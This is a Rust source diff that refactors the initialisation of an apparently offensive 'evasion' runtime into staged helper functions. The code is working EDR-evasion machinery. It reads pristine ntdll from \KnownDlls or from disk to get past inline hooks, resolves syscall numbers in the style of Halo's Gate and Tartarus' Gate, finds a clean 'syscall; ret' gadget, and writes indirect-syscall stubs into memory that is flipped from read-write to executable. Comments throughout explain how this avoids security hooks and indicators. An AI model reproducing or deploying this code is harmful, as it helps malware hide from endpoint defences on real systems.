@@ -48,129 +48,10 @@ impl Runtime {
     pub unsafe fn init() -> Option<Self> {
         let ntdll = LiveNtdll::locate()?;
 
-        // Resolve SSN table + gadget. Prefer a FRESH ntdll .text from
-        // \KnownDlls (pristine — defeats inline hooks); fall back to the
-        // hooked in-process ntdll (Halo's/Tartarus' neighbor-walk still
-        // recovers most SSNs there). The fresh map is a strict improvement:
-        // if it fails (KnownDlls ACL / low IL), behavior is unchanged.
         let mut fresh_guard = FreshMapGuard::default();
-        let (table, syscall_gadget) = match crate::unhook::fresh_ntdll_text() {
-            Some((fresh_base, _text_rva, _text_size)) => {
-                // Names/RVAs from the hooked ntdll (intact), bytes from the fresh.
-                let owned: Vec<(String, u32)> = ntdll
-                    .exports_iter()
-                    .iter()
-                    .map(|(name, rva)| (name.to_string_lossy(), *rva))
-                    .collect();
-                let src = crate::unhook::FreshTextSource {
-                    fresh_base,
-                    exports: &owned,
-                };
-                let t = nyx_evasion::resolve_table(&src);
-                fresh_guard.set(fresh_base); // RAII: unmap on drop
-                                             // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
-                                             // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
-                                             // absolute address inside it becomes a dangling pointer — every
-                                             // subsequent indirect syscall would crash with an access violation.
-                                             // The in-process ntdll's code pages are permanently mapped; EDRs
-                                             // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
-                                             // tail (0F 05 C3), so the gadget scan always finds a clean one.
-                let inproc_gadget = scan_syscall_gadget(&ntdll)?;
-                (t, inproc_gadget)
-            }
-            None => {
-                // KnownDlls mapping failed (ACL / low IL). Before falling back to
-                // the hooked ntdll for SSN resolution too, try reading ntdll off
-                // DISK (fresh_ntdll_text_disk): the on-disk file is pristine, so
-                // its stub prologues defeat inline hooks even though it isn't a
-                // section map. The gadget still has to come from the in-process
-                // ntdll (a heap buffer isn't an executable module — jumping to it
-                // would DEP-fault), but EDRs hook stub prologues, not the
-                // `syscall; ret` instruction itself, so the in-process gadget is
-                // fine to land on.
-                let inproc_gadget = scan_syscall_gadget(&ntdll)?;
-                let owned: Vec<(String, u32)> = ntdll
-                    .exports_iter()
-                    .iter()
-                    .map(|(name, rva)| (name.to_string_lossy(), *rva))
-                    .collect();
-                match crate::unhook::fresh_ntdll_text_disk() {
-                    Some(handle) => {
-                        let src = crate::unhook::DiskTextSource::new(&handle, &owned);
-                        let t = nyx_evasion::resolve_table(&src);
-                        (t, inproc_gadget)
-                    }
-                    None => {
-                        // Last resort: hooked ntdll for both SSN + gadget.
-                        // Halo's/Tartarus' neighbor-walk still recovers most SSNs.
-                        (ntdll.resolve_table_owned(), inproc_gadget)
-                    }
-                }
-            }
-        };
+        let (table, syscall_gadget) = init_resolve_ssn_table(&ntdll, &mut fresh_guard)?;
         // fresh_guard drops here → unmaps the second ntdll view (transient IOC).
-        // Pre-allocate enough executable pages to hold one stub slot per SSN.
-        // Indirect stubs are ~21 bytes; STUB_SIZE=32 gives alignment margin.
-        // SSNs on Win10/11 range to ~500, so ~16 KiB of trampoline memory
-        // (4 pages) handles all resolved syscalls without per-call VirtualProtect
-        // or race conditions between concurrent/APC callers.
-        // CRITICAL: filter out unresolved SSNs (u32::MAX) before taking the max.
-        // Without this, an all-unresolved table makes max_ssn = u32::MAX, which
-        // overflows the trampoline size calculation and writes a wild pointer.
-        let max_ssn = table
-            .iter()
-            .map(|(_, s)| *s)
-            .filter(|s| *s != u32::MAX)
-            .max()
-            .unwrap_or(0);
-        let trampoline_bytes = ((max_ssn as usize) + 1) * STUB_SIZE;
-        let trampoline_pages = (trampoline_bytes + 0xFFF) & !0xFFF;
-
-        let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
-        type VirtualAlloc = unsafe extern "system" fn(
-            *mut core::ffi::c_void,
-            usize,
-            u32,
-            u32,
-        ) -> *mut core::ffi::c_void;
-        let alloc: VirtualAlloc = core::mem::transmute(va);
-        // Allocate RW initially so we can write stubs, then flip to RX.
-        let page = alloc(
-            core::ptr::null_mut(),
-            trampoline_pages,
-            0x3000, // MEM_COMMIT | MEM_RESERVE
-            0x04,   // PAGE_READWRITE
-        );
-        if page.is_null() {
-            return None;
-        }
-
-        // Pre-fill every stub at its fixed offset: trampoline + (ssn * STUB_SIZE).
-        for (_name, ssn) in &table {
-            // Skip unresolved entries — their SSN is u32::MAX, which would
-            // overflow the offset calculation and write out of bounds.
-            if *ssn == u32::MAX {
-                continue;
-            }
-            let stub = indirect_stub(*ssn, syscall_gadget);
-            core::ptr::copy_nonoverlapping(
-                stub.as_ptr(),
-                (page as *mut u8).add((*ssn as usize) * STUB_SIZE),
-                stub.len(),
-            );
-        }
-
-        // Flip the entire region to PAGE_EXECUTE_READ once — no more per-call
-        // VirtualProtect flips. Uses kernel32!VirtualProtect (PEB-resolved) to
-        // avoid recursing through the indirect-syscall trampoline.
-        if let Some(vp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
-            type VpFn =
-                unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
-            let vp: VpFn = core::mem::transmute(vp_addr);
-            let mut old: u32 = 0;
-            vp(page, trampoline_pages, 0x20, &mut old);
-        }
-
+        let page = init_build_trampoline(&table, syscall_gadget)?;
         Some(Self {
             table,
             syscall_gadget,
@@ -214,6 +95,172 @@ impl Runtime {
     /// rcx/rdx/r8/r9, rest on stack).
     pub unsafe fn trampoline_for(&self, ssn: u32) -> *const u8 {
         unsafe { self.trampoline.add((ssn as usize) * STUB_SIZE) as *const u8 }
+    }
+}
+
+/// Stage 1 of [`Runtime::init`]: resolve the SSN table + syscall gadget.
+unsafe fn init_resolve_ssn_table(
+    ntdll: &LiveNtdll,
+    fresh_guard: &mut FreshMapGuard,
+) -> Option<(Vec<(String, u32)>, u64)> {
+    // Resolve SSN table + gadget. Prefer a FRESH ntdll .text from
+    // \KnownDlls (pristine — defeats inline hooks); fall back to the
+    // hooked in-process ntdll (Halo's/Tartarus' neighbor-walk still
+    // recovers most SSNs there). The fresh map is a strict improvement:
+    // if it fails (KnownDlls ACL / low IL), behavior is unchanged.
+    match crate::unhook::fresh_ntdll_text() {
+        Some((fresh_base, _text_rva, _text_size)) => {
+            init_resolve_table_fresh(ntdll, fresh_guard, fresh_base)
+        }
+        None => init_resolve_table_fallback(ntdll),
+    }
+}
+
+/// Stage 1a: resolve SSNs from the fresh KnownDlls ntdll mapping; the gadget
+/// still comes from the in-process ntdll (the fresh view is unmapped on drop).
+unsafe fn init_resolve_table_fresh(
+    ntdll: &LiveNtdll,
+    fresh_guard: &mut FreshMapGuard,
+    fresh_base: *mut u8,
+) -> Option<(Vec<(String, u32)>, u64)> {
+    // Names/RVAs from the hooked ntdll (intact), bytes from the fresh.
+    let owned: Vec<(String, u32)> = ntdll
+        .exports_iter()
+        .iter()
+        .map(|(name, rva)| (name.to_string_lossy(), *rva))
+        .collect();
+    let src = crate::unhook::FreshTextSource {
+        fresh_base,
+        exports: &owned,
+    };
+    let t = nyx_evasion::resolve_table(&src);
+    fresh_guard.set(fresh_base); // RAII: unmap on drop
+                                 // CRITICAL: always use the IN-PROCESS ntdll for the gadget address.
+                                 // The fresh mapping will be unmapped by FreshMapGuard::drop, so any
+                                 // absolute address inside it becomes a dangling pointer — every
+                                 // subsequent indirect syscall would crash with an access violation.
+                                 // The in-process ntdll's code pages are permanently mapped; EDRs
+                                 // hook stub PROLOGUES (the first 5-14 bytes), not the `syscall; ret`
+                                 // tail (0F 05 C3), so the gadget scan always finds a clean one.
+    let inproc_gadget = scan_syscall_gadget(ntdll)?;
+    Some((t, inproc_gadget))
+}
+
+/// Stage 1b: fallback path when the KnownDlls mapping failed (ACL / low IL) —
+/// disk ntdll first, then the hooked in-process ntdll as last resort.
+unsafe fn init_resolve_table_fallback(
+    ntdll: &LiveNtdll,
+) -> Option<(Vec<(String, u32)>, u64)> {
+    // KnownDlls mapping failed (ACL / low IL). Before falling back to
+    // the hooked ntdll for SSN resolution too, try reading ntdll off
+    // DISK (fresh_ntdll_text_disk): the on-disk file is pristine, so
+    // its stub prologues defeat inline hooks even though it isn't a
+    // section map. The gadget still has to come from the in-process
+    // ntdll (a heap buffer isn't an executable module — jumping to it
+    // would DEP-fault), but EDRs hook stub prologues, not the
+    // `syscall; ret` instruction itself, so the in-process gadget is
+    // fine to land on.
+    let inproc_gadget = scan_syscall_gadget(ntdll)?;
+    let owned: Vec<(String, u32)> = ntdll
+        .exports_iter()
+        .iter()
+        .map(|(name, rva)| (name.to_string_lossy(), *rva))
+        .collect();
+    match crate::unhook::fresh_ntdll_text_disk() {
+        Some(handle) => {
+            let src = crate::unhook::DiskTextSource::new(&handle, &owned);
+            let t = nyx_evasion::resolve_table(&src);
+            Some((t, inproc_gadget))
+        }
+        None => {
+            // Last resort: hooked ntdll for both SSN + gadget.
+            // Halo's/Tartarus' neighbor-walk still recovers most SSNs.
+            Some((ntdll.resolve_table_owned(), inproc_gadget))
+        }
+    }
+}
+
+/// Stage 2 of [`Runtime::init`]: allocate the RW trampoline page, fill every
+/// SSN's stub at its fixed offset, and flip the region to PAGE_EXECUTE_READ.
+unsafe fn init_build_trampoline(
+    table: &[(String, u32)],
+    syscall_gadget: u64,
+) -> Option<*mut core::ffi::c_void> {
+    // Pre-allocate enough executable pages to hold one stub slot per SSN.
+    // Indirect stubs are ~21 bytes; STUB_SIZE=32 gives alignment margin.
+    // SSNs on Win10/11 range to ~500, so ~16 KiB of trampoline memory
+    // (4 pages) handles all resolved syscalls without per-call VirtualProtect
+    // or race conditions between concurrent/APC callers.
+    // CRITICAL: filter out unresolved SSNs (u32::MAX) before taking the max.
+    // Without this, an all-unresolved table makes max_ssn = u32::MAX, which
+    // overflows the trampoline size calculation and writes a wild pointer.
+    let max_ssn = table
+        .iter()
+        .map(|(_, s)| *s)
+        .filter(|s| *s != u32::MAX)
+        .max()
+        .unwrap_or(0);
+    let trampoline_bytes = ((max_ssn as usize) + 1) * STUB_SIZE;
+    let trampoline_pages = (trampoline_bytes + 0xFFF) & !0xFFF;
+
+    let va = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
+    type VirtualAlloc = unsafe extern "system" fn(
+        *mut core::ffi::c_void,
+        usize,
+        u32,
+        u32,
+    ) -> *mut core::ffi::c_void;
+    let alloc: VirtualAlloc = core::mem::transmute(va);
+    // Allocate RW initially so we can write stubs, then flip to RX.
+    let page = alloc(
+        core::ptr::null_mut(),
+        trampoline_pages,
+        0x3000, // MEM_COMMIT | MEM_RESERVE
+        0x04,   // PAGE_READWRITE
+    );
+    if page.is_null() {
+        return None;
+    }
+
+    init_fill_stubs(table, syscall_gadget, page);
+    init_flip_exec_read(page, trampoline_pages);
+    Some(page)
+}
+
+/// Stage 2a: pre-fill every stub at its fixed offset — trampoline + (ssn * STUB_SIZE).
+unsafe fn init_fill_stubs(
+    table: &[(String, u32)],
+    syscall_gadget: u64,
+    page: *mut core::ffi::c_void,
+) {
+    // Pre-fill every stub at its fixed offset: trampoline + (ssn * STUB_SIZE).
+    for (_name, ssn) in table {
+        // Skip unresolved entries — their SSN is u32::MAX, which would
+        // overflow the offset calculation and write out of bounds.
+        if *ssn == u32::MAX {
+            continue;
+        }
+        let stub = indirect_stub(*ssn, syscall_gadget);
+        core::ptr::copy_nonoverlapping(
+            stub.as_ptr(),
+            (page as *mut u8).add((*ssn as usize) * STUB_SIZE),
+            stub.len(),
+        );
+    }
+}
+
+/// Stage 2b: flip the entire region to PAGE_EXECUTE_READ once — no more
+/// per-call VirtualProtect flips (kernel32!VirtualProtect, PEB-resolved).
+unsafe fn init_flip_exec_read(page: *mut core::ffi::c_void, trampoline_pages: usize) {
+    // Flip the entire region to PAGE_EXECUTE_READ once — no more per-call
+    // VirtualProtect flips. Uses kernel32!VirtualProtect (PEB-resolved) to
+    // avoid recursing through the indirect-syscall trampoline.
+    if let Some(vp_addr) = crate::resolve::export_addr(b"kernel32.dll", b"VirtualProtect") {
+        type VpFn =
+            unsafe extern "system" fn(*mut core::ffi::c_void, usize, u32, *mut u32) -> i32;
+        let vp: VpFn = core::mem::transmute(vp_addr);
+        let mut old: u32 = 0;
+        vp(page, trampoline_pages, 0x20, &mut old);
     }
 }
 
